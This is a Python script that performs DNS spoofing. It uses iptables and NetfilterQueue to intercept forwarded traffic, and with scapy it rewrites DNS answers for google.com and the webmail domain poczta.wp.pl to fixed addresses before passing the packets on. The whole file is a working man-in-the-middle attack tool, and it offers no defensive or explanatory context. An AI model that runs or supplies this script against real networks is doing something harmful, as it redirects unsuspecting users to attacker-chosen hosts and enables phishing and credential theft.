import os

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR
from netfilterqueue import NetfilterQueue

# Constants
host_dict = {
    b"google.com.": "10.10.10.10",
    b"poczta.wp.pl.": "5.5.5.5"
}
queue_num = 1
queue = NetfilterQueue()


def spoof():
    os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}')
    print("Added iptables rule")
    queue.bind(queue_num, callback)
    try:
        queue.run()
    except KeyboardInterrupt:
        os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {queue_num}')
        print("\nDeleted iptables rule")


def callback(captured_packet):
    scapy_packet = IP(captured_packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            print("original - ", scapy_packet[DNSQR].summary)
            # log.info(f'[original] {scapy_packet[DNSRR].summary()}')
            query_name = scapy_packet[DNSQR].qname
            if query_name in host_dict:
                scapy_packet[DNS].an = DNSRR(rrname=query_name, rdata=host_dict[query_name])
                scapy_packet[DNS].ancount = 1
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum
                print("modified - ", scapy_packet.mysummary())
                # log.info(f'[modified] {scapy_packet[DNSRR].summary()}')
            else:
                print("not modified - ", scapy_packet.mysummary())
                # log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
        except IndexError as ie:
            print("IndexError ", ie)
        captured_packet.set_payload(bytes(scapy_packet))
    return captured_packet.accept()


if __name__ == '__main__':
    print("Start DNS Spoofing")
    try:
        spoof()
    except OSError as ose:
        print("OSError ", ose)
